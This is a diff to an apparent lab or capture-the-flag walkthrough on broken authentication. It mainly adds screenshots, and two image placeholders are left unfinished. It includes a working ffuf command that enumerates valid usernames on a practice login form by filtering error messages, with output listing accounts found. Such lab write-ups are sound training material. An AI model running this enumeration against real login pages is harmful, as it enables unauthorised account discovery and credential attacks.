@@ -11,28 +11,33 @@ Ome of the updates is a new password policy that was designed to improve account
 Reconnaissance is straightforward, simply go to the login page:
 
 	http://154.57.164.82:30826/login.php
-
+<p align="center">
+	<img width="860" height="665" alt="ba-login" src="https://github.com/user-attachments/assets/be3ab553-144d-41dc-8708-c0b241a3d371" />
+</p>
 
 Lets try the default credentials:
 
 	Username: admin
 	Password: admin
 
-
+<p align="center">
+	<img width="859" height="725" alt="ba-login-unknown" src="https://github.com/user-attachments/assets/5bbcf9e4-b1c5-42f0-a9c2-e7f56f156fce" />
+</p>
 
 - This didn't work, we got the error message:
 
 		Unknown username or password.
 
-
-Notice the option: "Register a new account"
+However, notice the option: "Register a new account"
 
 - If you follow the link and attempt, and fail to create an account the site will provide us with valuable information regarding the account passwords:
 
-
+<p align="center">
+	<img width="861" height="852" alt="ba-register" src="https://github.com/user-attachments/assets/e225cdf5-4805-48fc-bbd3-19eb56e08a92" />![Uploading ba-login-unknown.png…]()
+![Uploading ba-login-unknown.png…]()
+</p>
 
 	- The site employs several useful password restrictions, although requiring a password lenght to be exactly 12 characters would make brute forcing significantly easier.
-
 
 
 
@@ -46,7 +51,13 @@ Let's start by creating an account:
 
 If we go back to the login, lets see what happens if we login with the wrong password:
 
-	$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://154.57.164.82:30639/login.php" -d "username=FUZZ&password=Playstation1" -fr "Unknown username or password." -fc 403 -w /usr/share/seclists/Usernames/Names/names.txt
+<p align="center">
+	<img width="860" height="735" alt="ba-login-invalid" src="https://github.com/user-attachments/assets/e00071c5-470c-40aa-98a3-d9d46b681bca" />
+</p>
+
+The error message is different, lets see if we can use this to discover any other accounts:
+
+	$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://154.57.164.82:30639/login.php" -d "username=FUZZ&password=Playstation3" -fr "Unknown username or password." -fc 403 -w /usr/share/seclists/Usernames/Names/names.txt
 	...
 	admin                   [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 224ms]
 	gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 188ms]
